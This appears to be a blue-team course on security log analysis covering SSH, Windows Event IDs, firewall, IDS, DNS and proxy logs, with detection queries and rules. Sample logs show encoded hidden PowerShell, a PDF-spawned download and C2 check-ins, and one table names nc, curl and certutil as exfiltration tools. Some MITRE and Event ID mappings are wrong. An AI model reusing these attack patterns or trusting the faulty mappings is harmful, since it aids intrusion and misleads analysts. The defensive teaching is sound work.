+Technique 2: Looking for Lateral Movement via SSH
+Correlate login events from internal IPs that are not part of the jump host or bastion:
+grep "Accepted password" /var/log/auth.log | grep -vE '192\.168\.0\.1|10\.0\.0\.1'
+Technique 3: Monitoring Sudden Sudo Usage Spike
+Generate usage frequency per user:
+grep "sudo" /var/log/auth.log | awk '{print $1, $2, $3, $9}' | sort | uniq -c | sort -nr
+Useful to flag sudden or unusual use of sudo from accounts that normally don’t escalate.
+Technique 4: Detecting User Enumeration Scans
+grep "Invalid user" /var/log/auth.log | awk '{print $(NF)}' | sort | uniq -c | sort -nr
+Track usernames being probed to identify attempts at discovery before access.
+Parsing and Enrichment with Tools
+Use of ausearch for auditing (if auditd is enabled)
+ausearch -m USER_LOGIN -ts recentausearch -ua 1001
+Useful for retrieving user-specific login sessions and mapping UID to usernames.
+Log aggregation example with syslog to central server
+Configuration in /etc/rsyslog.conf:
+*.* @@logserver.local:514
+Forwarding with auditd (audit.rules)
+-w /etc/passwd -p wa -k passwd_changes-w /bin/su -p x -k su_usage
+Can help track command usage and critical file modifications.
+SSH Honeypot Example and Log Behavior
+Cowrie Honeypot Example (mimicking SSH service)
+2025-06-30T17:00:15 login attempt [admin:123456] from 103.123.98.122025-06-30T17:00:16 failed login attempt [admin:123456]2025-06-30T17:00:17 failed login attempt [admin:qwerty]
+Attackers often use common credentials. A spike in login attempts from diverse IPs with common usernames indicates automated scanning.
+Summary of Log-Based SSH Attack Indicators
+Indicator | Description
+Multiple failed attempts | Brute-force or credential stuffing
+Use of invalid users | Enumeration or scanning
+Success after multiple failures | Possible credential compromise
+Use of SSH keys from unknown sources | Persistence via authorized_keys
+SSH access from foreign IP | Potential unauthorized external access
+Sudo for suspicious commands | Attempted privilege escalation or download exec
+Foundations of Log Analysis for Cyber Defense - 2.2 Windows Event Logs and Security Monitoring
+Introduction
+Windows Event Logs are one of the pillars of visibility in Microsoft environments. All security-relevant activity, such as authentications, process creation, privilege changes, and remote connections, is natively logged by the operating system. The ability to interpret specific events is critical to detecting attacks such as brute-force, malware use, execution of administrative commands, or persistence through privilege escalation.
+Types of Windows Event Logs
+Windows classifies its logs into three main categories:
+System Logs Information about drivers, hardware failures, and operating system services.
+Application Logs Events generated by software installed on the system (e.g., SQL Server, Office, Chrome).
+Security Logs Main focus for the Blue Team. Contains authentication, account changes, process creation, use of credentials, among others.
+Access via Event Viewer: Start > Run > eventvwr.msc
+Key Event IDs for Blue Team Analysts
+Event ID | Description | Use Case
+4624 | Successful logon | RDP, SMB, interactive or scheduled logons
+4625 | Failed logon | Brute-force attempts or invalid credentials
+4634 | Logoff event | Session closure
+4648 | Logon using explicit credentials | Lateral movement (runas, PSRemoting)
+4672 | Special privileges assigned to new logon | Admin or SYSTEM-level access
+4688 | New process creation | Malware, tools like PowerShell or cmd
+4689 | Process termination | Hiding evidence, persistence cleanup
+4697 | New service installed | Persistence via service creation
+4720 | User account created | Rogue user creation
+4723 | Password change attempt | Account manipulation
+4769 | Kerberos ticket requested (TGS) | Pass-the-Ticket detection
+Example: Successful Logon (4624)
+Log Name: Security  Event ID: 4624  Logon Type: 10 (RemoteInteractive)  Account Name: administrator  Source Network Address: 192.168.1.100
+Interpretation:
+Administrator successfully authenticated via RDP from 192.168.1.100.
+Logon Types (commonly used for detection logic):
+* 2 = Interactive (local)
+* 3 = Network (SMB, CIFS)
+* 5 = Service
+* 10 = Remote Desktop
+* 11 = Cached Interactive
+Example: Failed Logon (4625)
+Event ID: 4625  Failure Reason: Unknown user name or bad password  Logon Type: 3  Account Name: admin  Source Network Address: 10.10.10.5
+Interpretation:
+Failed network logon attempt, likely via SMB or shared folder access.
+Use case:
+Detection of brute-force or lateral movement attempts.
+Example: Process Creation (4688)
+Event ID: 4688  New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  Command Line: powershell.exe -EncodedCommand SQBtAGUAbABvAGcA
+Use case:
+Flag command line usage of PowerShell with Base64-encoded content. Common in malware execution and evasive scripts.
+Tools for Accessing Event Logs
+Event Viewer GUI
+* Navigate to Windows Logs > Security
+* Use the Filter Current Log feature
+* Save filtered logs as .evtx files for offline review
+PowerShell Queries
+# Get latest 10 security eventsGet-WinEvent -LogName Security -MaxEvents 10# Filter for failed logon attemptsGet-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Format-Table TimeCreated, Message -AutoSize# Search process executionGet-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} | Select-String "powershell"
+Windows Event Forwarding (WEF)
+* Centralizes logs from multiple endpoints to a single collector
+* Uses Windows native components (Group Policy + WEC)
+* SIEM-friendly for enterprise-scale deployments
+Common Detection Use Cases
+Use Case 1: RDP Brute-Force
+* Many 4625 events followed by a 4624 with Logon Type 10
+* Correlation:
+* Source IP remains the same
+* Usernames attempted vary
+* Time window is narrow (e.g., <5 minutes)
+Use Case 2: Execution of Suspicious Tools
+* 4688 for cmd.exe, powershell.exe, mshta.exe, rundll32.exe
+* Correlate with parent process to detect unusual origins
+* Command line should be parsed and inspected for encoded content
+Use Case 3: Lateral Movement via Explicit Credentials
+* 4648 with suspicious target systems
+* Example: attacker uses runas or invokes Invoke-Command over WinRM
+Use Case 4: Persistence via Service Installation
+* 4697 followed by 4624 or 4688 indicating execution
+* Services with unusual names or paths (e.g., in temp directories)
+Filtering and Parsing Logs for Detection
+When forwarding to a SIEM, it's best to extract and normalize key fields:
+* EventID
+* AccountName
+* LogonType
+* ProcessName
+* ParentProcessName
+* SourceNetworkAddress
+Example: Splunk SPL Search
+index=windows EventCode=4688 | stats count by New_Process_Name, Parent_Process_Name| where count > 5
+Example: Elastic SIEM (KQL)
+event.code: "4625" and source.ip: "192.168.1.10"
+Best Practices
+* Enable advanced audit policy (Audit Process Creation, Audit Logon Events, etc.)
+* Configure Group Policy to include command-line logging:
+* Administrative Templates > System > Audit Process Creation > Include command line in process creation events
+* Retain at least 90–180 days of Security.evtx logs
+* Use Sysmon alongside native logs for deeper telemetry (e.g., file writes, registry access)
+Technique 1: Detecting Credential Access and Privilege Escalation
+Correlate Event ID 4648 (explicit credentials) with 4624 (logon) and 4672 (admin privileges)
+Use case: Adversaries executing tools like runas, PsExec, or Invoke-Command over WinRM often generate these events.
+Example Sequence:
+Event ID 4648: A logon was attempted using explicit credentialsEvent ID 4624: Successful logon (Logon Type 3 or 10)Event ID 4672: Special privileges assigned (e.g., SeDebugPrivilege)
+Detection Logic:
+* Track rare use of Event ID 4648
+* Cross-reference account name and source IP
+* Confirm if the account used received elevated privileges (4672)
+Technique 2: Hunting for Malicious PowerShell Execution
+Indicators in 4688 (process creation)
+* Use of powershell.exe or pwsh.exe
+* -EncodedCommand
+* -WindowStyle hidden, -nop, -exec bypass
+* Download commands: Invoke-WebRequest, System.Net.WebClient
+Example from Event Viewer:
+New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  Command Line: powershell.exe -nop -w hidden -EncodedCommand SQBtAGUAbABvAGcA
+Hunting Tip:
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} | Where-Object { $_.Message -match "powershell.*EncodedCommand" } |Format-Table TimeCreated, Message -AutoSize
+Map to MITRE ATT&CK T1059.001 (Command and Scripting Interpreter: PowerShell)
+Technique 3: Detecting Process Injection and Evasion
+Indicators:
+* Suspicious use of rundll32.exe, regsvr32.exe, mshta.exe
+* Unusual parent processes like explorer.exe spawning cmd.exe or powershell.exe
+* Direct execution from AppData, Temp, or mounted ISO paths
+Example:
+4688: New Process Name: C:\Users\user\AppData\Local\Temp\evil.exeParent Process Name: C:\Windows\explorer.exe
+Detection:
+* Highlight non-signed binaries executed from user-writable paths
+* Watch for mismatch in parent/child process behavior
+Technique 4: Account Manipulation and Persistence
+Monitor Event IDs:
+* 4720: User account created
+* 4722: Account enabled
+* 4732: User added to local admin group
+* 4798: User's group membership enumeration (often by attackers before privilege escalation)
+Example:
+A user account was created.Subject: SYSTEMNew Account Name: supportPrivileges: Administrator
+Detection Logic:
+* Any non-authorized user creating accounts
+* SYSTEM creating accounts during odd hours
+* Multiple group changes in a short time span
+Sysmon vs Native Windows Logs
+While native Event Logs are useful, Sysmon provides higher-fidelity telemetry with richer context. It is often used in conjunction with Windows Event Logs in advanced Blue Team setups.
+Feature | Windows Logs (4688, etc.) | Sysmon (Event ID 1, etc.)
+Includes hash of executables | No | Yes
+Tracks network connections | No | Yes (Event ID 3)
+File creation events | No | Yes (Event ID 11)
+Image loads | No | Yes (Event ID 7)
+Registry access | No | Yes (Event ID 13/14)
+Parent process visibility | Partial (4688) | Full detail
+Example Sysmon entry (Event ID 1):
+<Image> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </Image>  <CommandLine> powershell -nop -w hidden -c Invoke-WebRequest </CommandLine>  <ParentImage> C:\Users\user\Downloads\invoice.pdf </ParentImage>
+Use case: Detecting document-based payloads that spawn child processes.
+Mapped MITRE ATT&CK Use Cases (Selected)
+Technique | Event IDs Involved | Description
+T1078 – Valid Accounts | 4624, 4625, 4648 | Use of stolen or valid credentials
+T1059 – Command and Scripting | 4688, Sysmon 1 | PowerShell, cmd, mshta execution
+T1547 – Boot or Logon Autostart | 4697, 7045 (Sysmon 6) | Services or registry autoruns
+T1086 – PowerShell | 4688, Sysmon 1 | Scripting with encoded commands
+T1047 – Windows Admin Shares | 5140 (share accessed), 4624 | Remote access via C$, ADMIN$
+T1112 – Modify Registry | Sysmon 13, 14 | Registry persistence or configuration change
+T1105 – Ingress Tool Transfer | Sysmon 3 | File transfer via PowerShell or malware
+Practical Exercise Example
+Scenario: You receive alerts of suspicious behavior from a workstation. You collect and review the Security log.
+You find:
+* Event ID 4624 (Logon Type 3) from IP 10.1.1.23 to user finance_admin
+* Event ID 4672 immediately after, showing elevated privileges
+* Event ID 4688 launching powershell.exe -EncodedCommand
+* No logoff (4634) found for this session
+Interpretation:
+* Possible credential theft and lateral movement
+* The attacker used a valid user (finance_admin) to access the system
+* Gained admin privileges (4672)
+* Executed encoded PowerShell (possibly malware)
+* Session remains open
+Additional Blue Team Tips
+* Collect logs from all endpoints, not just domain controllers
+* Monitor for unexpected accounts with admin rights
+* Normalize and enrich data with threat intel (e.g., known bad IPs)
+* Use dashboards to track logon anomalies and rare command executions
+* Harden auditing via Group Policy to ensure full visibility
+Foundations of Log Analysis for Cyber Defense - 2.3 Comparison Between Linux and Windows Logging
+Introduction
+Windows and Linux are both widely used operating systems in enterprise environments, and each has its own architecture for generating, storing, and querying logs. For security analysts, understanding these differences is critical to creating a cohesive approach to monitoring, threat detection, and incident response.
+This topic compares the two operating systems in terms of log sources, format, granularity, access, and practical use in the context of cybersecurity.
+Structural and Format Differences
+Aspect | Linux | Windows
+Log Format | Plain text (syslog), CSV, JSON | Binary (EVTX), XML (in some tools)
+Storage Location | /var/log/ | %SystemRoot%\System32\winevt\Logs\
+Access Method | CLI tools (grep, journalctl) | GUI (Event Viewer), PowerShell
+Log Rotation | Managed by logrotate | Automatic overwrite or manual archive
+Timestamps | Human-readable / UTC | UTC with local time context
+Custom Audit Tools | auditd, Syslog-NG, rsyslog | Advanced Audit Policy, Sysmon
+Authentication Logging Comparison
+Scenario | Linux Example Log | Windows Equivalent (Event ID)
+Successful login (local/SSH) | Accepted password for user from IP | 4624 (Logon Success)
+Failed login | Failed password for invalid user from IP | 4625 (Logon Failure)
+Privilege escalation | sudo: user : COMMAND=/bin/bash | 4672 (Admin privileges assigned), 4688 (command run)
+Remote access (RDP or SSH) | sshd: session opened for user from IP | 4624 (Logon Type 10 – RDP)
+Logoff | session closed for user | 4634 (Logoff)
+Observation:
+While Linux logs typically use simple, readable lines, Windows logs offer richer metadata but require tools for decoding binary .evtx format.
+Process Execution Comparison
+Event | Linux (auth.log or auditd) | Windows (Event Viewer or Sysmon)
+Process creation | auditd: execve("/bin/bash", ...) | 4688: New Process Created
+Command parameters | auditd or shell history (.bash_history) | 4688 + command line (if enabled via policy)
+File execution tracking | Not default; auditd or inotify required | Sysmon Event ID 1 (Process Create)
+Parent process identification | Manual via ps -ef --forest or audit logs | Available in 4688 and Sysmon
+File Access and Modification Logging
+Action | Linux | Windows
+File read/write/open/delete | Requires auditd or fanotify | Sysmon (Event IDs 11, 23)
+Log location | /var/log/audit/audit.log | Sysmon or third-party EDR
+Registry change logging | Not applicable | Sysmon Event ID 13 (Registry Set Value)
+Insight:
+Linux requires explicit configuration (auditd, incron, audit rules) to generate logs that are similar in granularity to what Windows provides nativamente via Sysmon or Group Policy Audit Policies.
+Log Visibility and Coverage
+Area | Linux Coverage | Windows Coverage
+Authentication events | Strong via auth.log, btmp | Strong via Security Log
+Process activity | Weak by default; strong with auditd | Moderate by default; strong with Sysmon
+Network activity | Weak; requires IPTables, Suricata | Weak; requires Sysmon or ETW-based tools
+File system access | Requires auditd or fanotify | Supported via Sysmon
+Script execution detection | Manual or auditd | Via 4688 and PowerShell logging
+Query and Search Capabilities
+Capability | Linux | Windows
+Basic log query | grep, awk, journalctl | Event Viewer GUI, Get-WinEvent
+Structured search | JSON logs with jq, ELK integrations | PowerShell with filters, Splunk/Elastic
+Log forwarding | rsyslog, syslog-ng, auditd | Windows Event Forwarding, GPO
+SIEM integration | Fluentd, Beats, syslog formats | Windows agents (Winlogbeat, NXLog, etc.)
+Response to Attacker Behavior (Example Mapping)
+Case Study:
+Attacker logs in remotely and executes a script to escalate privileges.
+Step | Linux | Windows
+Initial access | SSH accepted log in auth.log | Event ID 4624 (Logon Type 10)
+Enumeration | whoami, id (may not be logged) | Command line in 4688 or Sysmon
+Privilege escalation | sudo or SUID binary usage | Event ID 4672 + process with admin token
+Persistence attempt | crontab, systemd, rc.local | New service (4697), Run key, Task Scheduler
+Exfiltration or backdoor | nc, curl, scp usage | Powershell + IEX, certutil, curl.exe
+Analyst Takeaways
+* Linux logs are easier to read but require more effort to generate granular telemetry
+* Windows logs are richer but harder to parse manually without GUI or automation
+* Both systems benefit greatly from centralized collection, parsing, and correlation
+* Enabling verbose logging (PowerShell transcript, Sysmon, auditd) is critical in both environments
+* Use normalization layers in SIEMs to unify event fields from both platforms (e.g., source_ip, user_name, process_name)
+Foundations of Log Analysis for Cyber Defense - 3.1 Firewall Logs and Perimeter Monitoring
+Introduction
+Firewalls represent the first line of defense in network security. They control traffic flow based on predefined rules and are responsible for blocking unauthorized access attempts. Firewall logs are essential for visibility into network activity and are often the first source of evidence during an intrusion attempt.
+Analyzing firewall logs allows Blue Team professionals to:
+* Detect port scans and reconnaissance activity
+* Identify unauthorized access attempts
+* Observe inbound and outbound traffic patterns
+* Correlate alerts with other data sources such as IDS, endpoint logs, or proxy logs
+Common Firewall Types and Log Formats
+Firewall Type | Examples | Log Format
+Hardware Firewall | Cisco ASA, FortiGate | Syslog, proprietary
+Host-Based Firewall | iptables, UFW, Windows FW | Plaintext, CSV, EVTX
+Cloud Firewall | AWS SG/NACLs, Azure NSG | JSON, CloudWatch, Log Analytics
+Web Application Firewall | ModSecurity, AWS WAF | JSON, audit log text
+Most enterprise firewalls support Syslog output, which makes log ingestion into SIEM platforms straightforward.
+Anatomy of a Firewall Log Entry
+Example: iptables log (Linux, via syslog)
+Jan  1 14:45:31 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:02:03 SRC=192.168.0.10 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54321 PROTO=TCP SPT=51515 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Parsed Fields:
+* Action: BLOCK
+* Source IP: SRC=192.168.0.10
+* Destination IP: DST=10.0.0.5
+* Protocol: PROTO=TCP
+* Source Port: SPT=51515
+* Destination Port: DPT=22
+* Flags: SYN (connection attempt)
+Use Case: SSH access attempt blocked by firewall.
+Example: Cisco ASA Log Entry
+%ASA-6-106015: Deny TCP (no connection) from 192.168.1.100/45678 to 10.0.0.10/80 flags RST on interface outside
+* Severity: 6 (Informational)
+* Denied TCP traffic (no stateful connection established)
+* TCP flag RST indicates a reset
+* Traffic was blocked on the "outside" interface
+Common Blue Team Use Cases
+Port Scanning Detection
+* High volume of denied connections to multiple ports
+* Typically fast and sequential (e.g., ports 20–1024)
+grep "DPT=" /var/log/syslog | awk '{print $NF}' | sort | uniq -c | sort -nr
+Unusual Inbound Traffic
+* Logs showing source IPs from the internet targeting internal systems
+* Attempt to access uncommon services (e.g., telnet, NetBIOS, SNMP)
+Internal Lateral Movement
+* Unexpected east-west traffic between hosts
+* May indicate malware propagation, credential reuse, or internal recon
+Blocked Outbound Traffic
+* Systems attempting to reach known malicious IPs or non-standard ports
+* Example: malware beaconing attempts on port 8080 or 53 (DNS)
+Logging Best Practices
+* Log both allowed and denied traffic, especially denied connections
+* Always timestamp logs in UTC for cross-source correlation
+* Clearly label interfaces and zones (e.g., inside, outside, DMZ)
+* Normalize log fields for SIEM ingestion
+* Forward logs to a centralized collector via UDP/TCP Syslog
+Syslog forwarding example (Linux):
+:msg, contains, "UFW" @192.168.1.10:514
+SIEM Queries and Detection Rules
+Splunk Example: Blocked port scan detection
+index=firewall action=blocked | stats count by src_ip, dest_port | where count > 10
+Elastic Search (KQL)
+action: "BLOCKED" and destination.port >= 0
+Microsoft Sentinel (KQL)
+CommonSecurityLog| where DeviceVendor == "Fortinet"| where Message has "Deny"| summarize TotalAttempts = count() by SourceIP, DestinationPort| where TotalAttempts > 20
+Event Enrichment and Context
+To enhance analysis, enrich firewall logs with:
+* GeoIP: Identify source country for anomalies (e.g., login from foreign region)
+* Threat Intel Feeds: Match IPs against blocklists (e.g., AbuseIPDB, AlienVault OTX)
+* Traffic direction tags: inbound, outbound, lateral
+* Service tags: Based on destination port (e.g., DPT=3389 = RDP)
+This allows more meaningful alerting and contextual triage.
+Summary
+Firewall logs provide foundational visibility into inbound, outbound, and lateral traffic within an organization. When enriched, centralized, and correlated with endpoint or authentication logs, they become critical for early threat detection and forensic response. Properly tuned firewall logging policies and consistent parsing across systems allow analysts to detect reconnaissance, unauthorized access attempts, and malware behavior in near real time.
+Foundations of Log Analysis for Cyber Defense - 3.2 IDS/IPS Logs (Snort, Suricata)
+Introduction
+Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) are key components in a layered defense strategy. While firewalls focus on traffic control, IDS/IPS solutions analyze traffic contents and patterns for known and unknown threats.
+IDS: Detects and alerts on suspicious activity but does not block.
+IPS: Actively blocks or drops malicious traffic based on detection logic.
+Popular open-source IDS/IPS tools:
+* Snort (Cisco): Signature-based detection
+* Suricata (OISF): Multi-threaded engine with IDS/IPS/NSM capabilities
+* Zeek (formerly Bro): Network security monitoring, not signature-focused
+Understanding IDS/IPS Logs
+Logs from IDS/IPS systems usually include:
+* Timestamp: When the event occurred
+* Signature ID: Rule that triggered the alert
+* Source/Destination IP and Ports
+* Protocol and packet details
+* Message/Classification: Short description of the threat
+* Severity/Priority
+Example: Snort Alert Log
+[**] [1:1000001:1] ET SCAN Nmap Scripting Engine User-Agent Detected [**][Classification: Attempted Information Leak] [Priority: 2]06/30-14:22:10.123456 192.168.1.100:58000 -> 10.0.0.20:80TCP TTL:64 TOS:0x0 ID:1111 IpLen:20 DgmLen:48***A**** Seq: 0x0  Ack: 0x0  Win: 0x400  TcpLen: 20
+Explanation:
+* SID: 1000001 – custom or Emerging Threats rule
+* Classification: Info leak attempt
+* Traffic: From internal system to web server on port 80
+* User-Agent detection: Possibly an Nmap scan with NSE scripts
+Example: Suricata EVE JSON Log (for ingestion in SIEM)
+{  "timestamp": "2025-06-30T14:22:10.123456Z",  "event_type": "alert",  "src_ip": "192.168.1.100",  "src_port": 58000,  "dest_ip": "10.0.0.20",  "dest_port": 80,  "proto": "TCP",  "alert": {    "action": "allowed",    "gid": 1,    "signature_id": 2100498,    "rev": 3,    "signature": "ET SCAN Nmap Scripting Engine User-Agent Detected",    "category": "Attempted Information Leak",    "severity": 2  }}
+Benefits of Suricata JSON:
+* Easy ingestion into SIEM tools
+* Structured format for correlation
+* Enables dashboards and alerting with high precision
+Use Cases for Blue Team
+1. Reconnaissance Detection
+* Rule triggered by unusual User-Agent, malformed DNS, or SMB probes
+* Suricata/Snort rule examples:
+* Nmap detection
+* Masscan signatures
+* DNS Tunneling attempt (e.g., unusually long queries)
+2. Exploit Attempts
+* Exploit kits, buffer overflow patterns, shellcode detection
+* Example: “ET EXPLOIT Possible CVE-2021-44228 Log4j JNDI Lookup”
+3. Malware Communication
+* C2 beaconing patterns (e.g., recurring HTTP POST every 10s)
+* ET signatures for malware families (e.g., TrickBot, Emotet)
+4. Data Exfiltration
+* Detection of large outbound data over uncommon ports
+* Protocol anomalies (e.g., HTTP POST with binary content)
+5. Lateral Movement
+* SMB/Windows admin share probes
+* Unusual internal RDP or PsExec use
+Rule Writing and Custom Signatures
+Snort Rule Example: Detecting Nmap user-agent
+alert tcp any any -> any 80 (msg:"Nmap NSE User-Agent"; content:"Nmap Scripting Engine"; http_header; sid:1000001;)
+Suricata Rule: DNS exfiltration pattern
+alert dns any any -> any any (msg:"Possible DNS Exfiltration"; dns.query; content:".xyz"; pcre:"/([a-zA-Z0-9]{20,})\.xyz$/"; sid:2022101;)
+Correlation Techniques
+* Enrich with Threat Intelligence: Match IPs/domains against threat feeds
+* Correlate by UID: Suricata can assign flow UIDs to track sessions
+* Pivot on Signature ID: Link alerts to MITRE ATT&CK techniques
+* Time-based correlation: Align IDS alerts with endpoint or firewall logs
+SIEM Examples
+Splunk – Detect Log4j Attempt
+index=suricata event_type=alert signature="*Log4j*"
+Elastic/Kibana – Detect beaconing
+{  "query": {    "match_phrase": {      "alert.signature": "C2 Generic Beacon Detected"    }  }}
+Microsoft Sentinel – Suricata NIDS Rule Trigger
+SuricataCL| where EventType == "alert"| where Signature contains "Nmap"
+IDS vs IPS Considerations
+Feature | IDS | IPS
+Action | Detects and alerts only | Detects and blocks traffic
+Risk | Lower (no disruption) | Higher (possible false positives)
+Deployment | Passive (SPAN port, TAP) | Inline (in path of traffic)
+Use case | Visibility and detection | Real-time enforcement
+Tuning and False Positive Reduction
+* Suppress noisy rules irrelevant to the environment
+* Customize signatures based on internal threat model
+* Use threshold rules to avoid alert floods
+* Monitor alert-to-action ratio for IPS (avoid blocking legitimate traffic)
+Example: Suppression in Snort
+suppress gen_id 1, sig_id 2010935, track by_src, ip 192.168.1.50
+Foundations of Log Analysis for Cyber Defense - 3.3 DNS Log Analysis
+Introduction
+DNS (Domain Name System) is one of the most critical services in a network. Nearly all network communication starts with a DNS request, making DNS logs a goldmine for detection and threat hunting.
+DNS logs provide visibility into:
+* Domain lookups by internal hosts
+* Indicators of malware or C2 communication
+* DNS tunneling and data exfiltration
+* Typo-squatting and phishing domain access
+Analyzing DNS traffic can reveal threats that evade traditional firewalls or antivirus tools.
+Common Sources of DNS Logs
+Source | Example | Format
+DNS Resolver Logs | BIND, Unbound, Windows DNS | Text, JSON
+Passive DNS Sensors | Zeek, SecurityOnion, Suricata | JSON, TSV
+Cloud Logs | AWS Route 53, GCP Cloud DNS | JSON
+Endpoint Logging | Sysmon (Event ID 22), EDR tools | EVTX, JSON
+Example Logs
+Windows DNS Server Log (Event Viewer, Analytical Log)
+Query Name: suspiciousdomain.xyzQuery Type: AClient IP: 192.168.1.105
+Zeek DNS Log
+1624864302.305429	Cd1nFl3fF8A3LsH0VO	192.168.1.10	53	google.com	A	0	NOERROR	F	0.001234
+Fields of Interest:
+* Timestamp
+* Query name (domain)
+* Query type (A, AAAA, TXT, etc.)
+* Client IP
+* Response code (NOERROR, NXDOMAIN)
+* TTL and answers (optional)
+Blue Team Use Cases
+1. Detecting Suspicious or Malicious Domains
+* Domains with low reputation
+* Recently registered domains (using threat intel feeds or passive DNS)
+* Known C2 infrastructure (MISP, OTX, VirusTotal)
+2. Identifying DNS Tunneling
+* TXT queries with long encoded strings
+* Excessive number of subdomains (e.g., abc123.xyz.c2domain.com)
+* Unusually high query frequency to a single domain
+3. DNS Exfiltration
+* Queries carrying base64-encoded data
+* Small DNS requests at regular intervals
+* Use of uncommon record types (TXT, NULL)
+4. Detection of Malware or Exploit Kits
+* Domain DGA patterns (e.g., randomly generated strings like sdfklweu.biz)
+* Domains resolved before payload execution
+* DNS requests during off-hours from user workstations
+Detection Techniques
+Rule-based detection in Zeek (example with DNS tunneling heuristic):
+event dns_request(c: connection, query: string){  if ( query like /[a-zA-Z0-9]{30,}/ )    print fmt("Possible DNS tunneling: %s from %s", query, c$id$orig_h);}
+Suricata alert for DNS over unusual port
+alert udp any any -> any !53 (msg:"Suspicious DNS Query on non-standard port"; dns.query; content:".com"; sid:100013;)
+Sigma rule for DNS via Sysmon
+detection:  selection:    EventID: 22    QueryName|contains: ['.xyz', '.top', '.club']
+Threat Hunting Examples
+Hunt for Newly Registered Domains
+index=dns_logs query=* | lookup domain_age_lookup domain AS query OUTPUT first_seen| where now() - first_seen < 259200  // domain < 3 days old
+Hunt for High-Frequency Queries
+index=dns_logs | stats count by src_ip, query | where count > 100
+Detect DGA-like Patterns
+def is_dga(domain):    import re    return bool(re.match(r'^[a-z0-9]{15,}\.com$', domain))
+Best Practices for DNS Logging
+* Enable full DNS logging on internal resolvers
+* Log both queries and responses (for context)
+* Timestamp logs in UTC and include client metadata
+* Store logs in a SIEM with enrichment
+* Apply threat intelligence feeds to DNS queries
+Enrichment and Correlation
+* Reputation Lookup: Use feeds like Cisco Umbrella, OTX, or VirusTotal
+* Passive DNS: Determine when a domain first appeared
+* WHOIS data: Inspect registration dates and registrar information
+* MITRE ATT&CK Mapping:
+* T1071.004 – Application Layer Protocol: DNS
+* T1046 – Network Service Scanning
+* T1095 – Non-Application Layer Protocol (custom DNS C2)
+Summary
+DNS logs are a powerful source of detection and intelligence. While DNS is a legitimate and necessary protocol, it is also frequently abused by threat actors for stealthy command-and-control and data exfiltration. A mature Blue Team operation should have full visibility into DNS activity and actively monitor for suspicious domains, traffic patterns, and signs of abuse.
+Foundations of Log Analysis for Cyber Defense - 3.4 Proxy and Web Filtering Logs
+Introduction
+Proxies and web filtering solutions are critical components in controlling and monitoring outbound traffic to the internet. They act as intermediaries between internal users and external resources, allowing organizations to enforce security policies, block malicious content, and log every web access attempt.
+Analyzing proxy and web filtering logs gives Blue Teams insights into user behavior, potential malware communications, data exfiltration, and phishing access attempts.
+Common tools that generate proxy logs include:
+* Squid Proxy
+* Blue Coat (Symantec ProxySG)
+* Palo Alto URL Filtering
+* Cisco Umbrella
+* FortiProxy
+* Zscaler
+Key Fields in Proxy Logs
+Typical fields in proxy or web filter logs:
+Field | Description
+Timestamp | Time of the request
+Source IP/User | Client that initiated the request
+URL/URI | Full requested URL
+Domain | Hostname/domain extracted from the URL
+HTTP Method | GET, POST, HEAD, etc.
+Response Code | HTTP response (200, 302, 403, etc.)
+Action Taken | Allowed, Blocked, Warned
+Category | Category assigned (e.g., "Malware", "Social Media")
+Bytes Sent/Received | Useful for identifying large transfers
+User Agent | Often used to detect scanners, scripts
+Example: Squid Proxy Log Entry
+1688130123.456  200 192.168.1.50 TCP_MISS/200 3456 GET http://malicious-site.com/ - HIER_DIRECT/203.0.113.10 text/html
+Explanation:
+* Timestamp: UNIX epoch
+* Elapsed time: 200ms
+* Client IP: 192.168.1.50
+* Action/Code: TCP_MISS/200 = request not cached, response 200 OK
+* Bytes: 3456
+* Method/URL: HTTP GET to malicious-site.com
+Example: Zscaler Web Filter Log (CSV)
+timestamp,src_ip,url,domain,http_method,response_code,action,category,user_agent2025-06-30T15:24:10Z,10.0.0.15,http://evil-server.com/c2/checkin.php,evil-server.com,POST,200,Allowed,Command and Control,Mozilla/5.0
+Red Flags:
+* POST method to C2 domain
+* Action is "Allowed"
+* Category is "Command and Control"
+Below is the JSON structure for Zscaler’s NSS Web Log Feed, as commonly used for ingestion into SIEMs. This format offers structured, field-rich entries suitable for parsing, enrichment, and correlation in Blue Team operations.
+Zscaler NSS Web Log JSON Format
+Here’s a typical example of a JSON log entry from Zscaler’s Web NSS feed (community.zscaler.com):
+{  "timestamp": "2025-06-30T15:24:10Z",  "c_ip": "10.0.0.15",  "cs_method": "POST",  "cs_host": "evil-server.com",  "cs_uri_path": "/c2/checkin.php",  "cs_uri_query": "",  "s_ip": "203.0.113.10",  "sc_status": "200",  "cs_user_agent": "Mozilla/5.0",  "cs_category": "Command and Control",  "cs_bytes": 1234,  "sc_bytes": 5678,  "action": "Allowed",  "sni": "evil-server.com"  // additional fields may be included depending on configuration}
+Field Definitions & Use Cases
+Field | Description | Blue Team Value
+timestamp | ISO8601 UTC timestamp of the HTTP transaction | Timeline correlation
+c_ip | Client IP address making the request | Identifying source host
+cs_method | HTTP request method (GET, POST, etc.) | Detect form submissions or data uploads
+cs_host | Host header/domain requested | Phishing or malware C2 identification
+cs_uri_path | Path of the HTTP request | Detect exploit paths or payload downloads
+sc_status | HTTP response status code | Indicators of blocked or redirect behavior
+cs_user_agent | HTTP User-Agent string | Browser vs. malware tool detection
+cs_category | Zscaler category label (e.g. “Command and Control”) | Policy violations and alerting
+action | Allowed, Blocked, Warned | Incident response policy enforcement
+cs_bytes / sc_bytes | Bytes sent/received | Data exfiltration detection
+sni | TLS SNI hostname | HTTPS inspection and domain mismatch detection
+Implementation Tips
+* Export as JSON format via NSS feed configuration
+* Map JSON fields in your SIEM: e.g., cs_host → destination.domain, c_ip → source.ip
+* Normalize categories and actions across your logging pipeline
+* Leverage field enrichment (GeoIP, threat intelligence) using c_ip and cs_host
+Use Cases for Blue Team
+1. Detecting Malware C2 and Dropper URLs
+* POST requests to suspicious domains
+* Requests to rare or uncategorized domains
+* URL patterns like /gate.php, /checkin, /load, etc.
+2. Phishing and Credential Harvesting
+* Access to domains categorized as "Phishing", "Newly Registered", or "Parked"
+* Form submissions (POST) to unfamiliar login pages
